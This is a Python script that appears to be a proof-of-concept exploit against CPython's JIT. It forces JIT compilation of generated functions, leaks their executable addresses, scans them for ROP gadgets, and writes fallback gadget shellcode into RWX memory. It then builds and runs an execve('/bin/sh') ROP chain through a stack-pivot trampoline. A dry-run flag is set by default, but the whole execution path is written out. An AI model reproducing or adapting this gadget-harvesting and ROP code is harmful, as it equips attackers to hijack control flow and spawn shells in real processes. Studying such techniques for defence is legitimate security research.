#!/usr/bin/env python3
import ctypes
import mmap
import struct
import json
from capstone import *
import jitexecleak

PAGE_SIZE = 0x1000

# MAGIC_VALUES updated to emphasize short, high-frequency instruction bytes observed
# in CPython JIT stencils rather than shellcode-derived 4-byte chunks. These integers
# are used as arithmetic seeds in generated Python functions to diversify JIT output;
# they are NOT injected as raw instructions. The selection favors sequences commonly
# found near function epilogues (pop reg; ret) and zeroing ops.
#
# Examples (byte sequences shown for clarity):
#   0x00_00_00_C3       -> b"\xC3"             (ret)
#   0x00_00_5F_C3       -> b"\x5F\xC3"         (pop rdi; ret)
#   0x00_00_5E_C3       -> b"\x5E\xC3"         (pop rsi; ret)
#   0x00_00_5A_C3       -> b"\x5A\xC3"         (pop rdx; ret)
#   0x00_00_5B_C3       -> b"\x5B\xC3"         (pop rbx; ret)
#   0x00_00_31_D2       -> b"\x31\xD2"         (xor edx, edx)
#   0x00_48_31_C0       -> b"\x48\x31\xC0"     (xor rax, rax)
MAGIC_VALUES = [
    0x000000C3,  # ret
    0x00005FC3,  # pop rdi; ret
    0x00005EC3,  # pop rsi; ret
    0x00005AC3,  # pop rdx; ret
    0x00005BC3,  # pop rbx; ret (temporary storage helper)
    0x000031D2,  # xor edx, edx
    0x004831C0,  # xor rax, rax
]

found_gadgets_global = {}
jit_func_dict = {}

def allocate_rwx(size=PAGE_SIZE):
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    addr = libc.mmap(None, size, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                     mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, -1, 0)
    if addr == -1:
        raise RuntimeError("mmap failed")
    return addr

def generate_jit_func_named(seed, magic_value, storage_dict):
    code = f"""
def f(x):
    # Nested helper to trigger CALL-related stencils (INIT_CALL_PY_EXACT_ARGS, etc.)
    def h(a, b):
        return (a ^ b) & 0xFFFFFFFF

    acc = x
    for i in range({3000 + seed * 500}):
        acc ^= ({magic_value} + (i << (i % 8)))
        acc = ((acc << (i % 5)) | (acc >> (32 - (i % 5)))) & 0xFFFFFFFF
        acc += ({magic_value} >> (i % 16))
        acc *= 3 + (i % 4)
        acc ^= (acc >> ((i+3) % 8))
        acc ^= ({magic_value} + i) * ((acc >> 3) & 0xff)
        acc += (i ^ {magic_value})
        # Call site intended to increase odds of xor edx, edx near ret in JIT stencils
        acc = h(acc, i & 0xff)
    return acc
"""
    scope = {}
    exec(code, scope)
    fn = scope['f']
    name = f'jit_func_{seed}'
    storage_dict[name] = fn
    print(f"[Generated function object: {name} for magic={hex(magic_value)}]")
    print(f"\n=== [Generated JIT Function: {name}] ===")
    print(code.strip())
    print(f"=== [End of {name}] ===\n")

def find_gadgets(jit_addr, blob, gadgets_needed):
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    found = {}
    for i in range(len(blob) - 10):
        insns = list(md.disasm(blob[i:i+10], jit_addr + i))
        if len(insns) >= 2:
            for mnemonic, operand in gadgets_needed:
                key = f"{mnemonic} {operand}".strip()
                if key in found:
                    continue
                if (insns[0].mnemonic == mnemonic and operand in insns[0].op_str and
                    insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
                    print(f"[+] Found gadget: {key}; ret @ {hex(insns[0].address)}")
    return found

def load_stencil_stats(path="stencil_gadgets.json"):
    """Load stencil gadget JSON (static scan) if present.
    Returns summary dict or None if unavailable."""
    try:
        with open(path, 'r') as f:
            data = json.load(f)
        return {
            'summary': data.get('summary', {}),
            'per_func_keys': list(data.get('per_func', {}).keys()),
            'has_pop_rdi_ret': any('pop_rdi_ret' in v for v in data.get('per_func', {}).values()),
            'has_pop_rsi_ret': any('pop_rsi_ret' in v for v in data.get('per_func', {}).values()),
            'has_pop_rdx_ret': any('pop_rdx_ret' in v for v in data.get('per_func', {}).values()),
        }
    except FileNotFoundError:
        return None
    except json.JSONDecodeError:
        return None

def provide_gadget_shellcode(mnemonic, operand=""):
    shellcodes = {
        "pop rax": b"\x58\xc3",
        "pop rdi": b"\x5f\xc3",
        "pop rsi": b"\x5e\xc3",
        "pop rdx": b"\x5a\xc3",
        "syscall": b"\x0f\x05\xc3",
    }
    key = f"{mnemonic} {operand}".strip()
    addr = allocate_rwx()
    ctypes.memmove(addr, shellcodes[key], len(shellcodes[key]))
    print(f"[+] Provided shellcode gadget '{key}' @ {hex(addr)}")
    return addr

def allocate_binsh():
    binsh_str = b"/bin/sh\x00"
    addr = allocate_rwx()
    ctypes.memmove(addr, binsh_str, len(binsh_str))
    return addr

def execute_rop_chain(gadgets, *, wait_for_enter=True):
    binsh_addr = allocate_binsh()
    stub = allocate_rwx()
    stack = allocate_rwx(0x1000)

    chain = [
        gadgets["pop rax"], 59,
        gadgets["pop rdi"], binsh_addr,
        gadgets["pop rsi"], 0,
        gadgets["pop rdx"], 0,
        gadgets["syscall"]
    ]

    print("\n=== [ ROP Stack Layout ] ===")
    for i, val in enumerate(chain):
        ctypes.c_uint64.from_address(stack + i * 8).value = val
        print(f"[Stack +{i*8:#04x}] = {hex(val)}")

    first_gadget_addr = chain[0]
    stack_after_first_gadget = stack + 8

    trampoline = b"\x48\xbc" + struct.pack("<Q", stack_after_first_gadget)
    trampoline += b"\x48\xb8" + struct.pack("<Q", first_gadget_addr)
    trampoline += b"\xff\xe0"
    ctypes.memmove(stub, trampoline, len(trampoline))

    print("\n=== [ Trampoline Info ] ===")
    print(f"[Trampoline Address]      = {hex(stub)}")
    print(f"[Trampoline Bytes]        = {trampoline.hex()}")
    print(f"[Stack Base Address]      = {hex(stack)}")
    print(f"[RSP after 1st gadget]    = {hex(stack_after_first_gadget)}")

    if wait_for_enter:
        input("\nPress Enter to execute ROP chain...\n")
    fn = ctypes.CFUNCTYPE(None)(stub)
    fn()

def jit_worker(seed, magic_value, gadgets_needed):
    global found_gadgets_global
    print(f"\n[*] Generating JIT function {seed} with magic 0x{magic_value:08X}...")
    generate_jit_func_named(seed, magic_value, jit_func_dict)
    jit_func = jit_func_dict[f'jit_func_{seed}']

    for i in range(5000):
        jit_func(i)

    try:
        jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
        print(f"[+] JIT function {seed} @ {hex(jit_addr)}, size: {size}")
    except RuntimeError as e:
        print(f"[!] JIT compilation failed for seed {seed}: {e}")
        return {}, None

    blob = (ctypes.c_ubyte * size).from_address(jit_addr)

    filtered_gadgets_needed = [
        (m, o) for m, o in gadgets_needed
        if f"{m} {o}".strip() not in found_gadgets_global
    ]

    found_gadgets = find_gadgets(jit_addr, bytes(blob), filtered_gadgets_needed)
    found_gadgets_global.update(found_gadgets)
    return found_gadgets, jit_addr

def main():
    global found_gadgets_global
    found_gadgets_global = {}

    # Load static stencil gadget hints (optional)
    stencil_info = load_stencil_stats()
    if stencil_info:
        print("[stencil-json] summary ret count=", stencil_info['summary'].get('ret'))
        print("[stencil-json] pop_rdi_ret present?", stencil_info['has_pop_rdi_ret'])
        print("[stencil-json] pop_rsi_ret present?", stencil_info['has_pop_rsi_ret'])
        print("[stencil-json] pop_rdx_ret present?", stencil_info['has_pop_rdx_ret'])
    else:
        print("[stencil-json] not found or unreadable; continuing without static hints")

    gadgets_needed = [
        ("pop", "rax"),
        ("pop", "rdi"),
        ("pop", "rsi"),
        ("pop", "rdx"),
        ("syscall", ""),
        # Secondary alternative for rdx=0 (do not require stack input)
        ("xor", "edx, edx"),
    ]
    remaining_gadgets = set(f"{m} {o}".strip() for m, o in gadgets_needed)

    # Configurable parameters (can be wired to argparse if needed)
    num_runs = 6
    dry_run = True  # Safe mode first: do not execute trampoline
    for seed in range(num_runs):
        if not remaining_gadgets:
            print("[*] 모든 가젯을 찾았습니다. 추가 탐색 중지.")
            break

        magic_value = MAGIC_VALUES[seed % len(MAGIC_VALUES)]
        print(f"[*] Seed {seed}, Magic Value {hex(magic_value)}로 탐색 시작")
        gadgets, jit_addr = jit_worker(seed, magic_value,
            [(m, o) for m, o in gadgets_needed if f"{m} {o}".strip() in remaining_gadgets])

        if jit_addr is None:
            continue

        for key, addr in gadgets.items():
            if key in remaining_gadgets:
                remaining_gadgets.remove(key)
                print(f"[+] 최종 선택된 gadget {key} from JIT @ {hex(addr)}")

    for key in list(remaining_gadgets):
        # Avoid providing shellcode for the alternative 'xor edx, edx' pattern; prefer pop rdx shellcode if needed
        if key.strip().lower() == "xor edx, edx":
            continue
        mnemonic, operand = key.split() if ' ' in key else (key, "")
        print(f"[!] Gadget {key} not found, providing shellcode.")
        found_gadgets_global[key] = provide_gadget_shellcode(mnemonic, operand)

    print("\n=== [ All Found Gadgets ] ===")
    for key, addr in found_gadgets_global.items():
        print(f"[+] {key:<12} => {hex(addr)}")

    if dry_run:
        print("\n[DRY-RUN] Skipping ROP chain execution. Found gadgets summary above.")
    else:
        # Build chain flexibly depending on available rdx gadget
        has_xor_edx = ("xor edx, edx" in found_gadgets_global)
        if has_xor_edx and ("pop rdx" not in found_gadgets_global):
            print("[info] Using 'xor edx, edx; ret' instead of 'pop rdx; ret'")
            # Execute with adapted chain
            gadgets = found_gadgets_global
            binsh_addr = allocate_binsh()
            stub = allocate_rwx()
            stack = allocate_rwx(0x1000)

            chain = [
                gadgets["pop rax"], 59,
                gadgets["pop rdi"], binsh_addr,
                gadgets["pop rsi"], 0,
                gadgets["xor edx, edx"],
                gadgets["syscall"],
            ]

            print("\n=== [ ROP Stack Layout ] ===")
            for i, val in enumerate(chain):
                ctypes.c_uint64.from_address(stack + i * 8).value = val
                print(f"[Stack +{i*8:#04x}] = {hex(val)}")

            first_gadget_addr = chain[0]
            stack_after_first_gadget = stack + 8

            trampoline = b"\x48\xbc" + struct.pack("<Q", stack_after_first_gadget)
            trampoline += b"\x48\xb8" + struct.pack("<Q", first_gadget_addr)
            trampoline += b"\xff\xe0"
            ctypes.memmove(stub, trampoline, len(trampoline))

            print("\n=== [ Trampoline Info ] ===")
            print(f"[Trampoline Address]      = {hex(stub)}")
            print(f"[Trampoline Bytes]        = {trampoline.hex()}")
            print(f"[Stack Base Address]      = {hex(stack)}")
            print(f"[RSP after 1st gadget]    = {hex(stack_after_first_gadget)}")

            input("\nPress Enter to execute ROP chain...\n")
            fn = ctypes.CFUNCTYPE(None)(stub)
            fn()
        else:
            execute_rop_chain(found_gadgets_global)

if __name__ == "__main__":
    main()
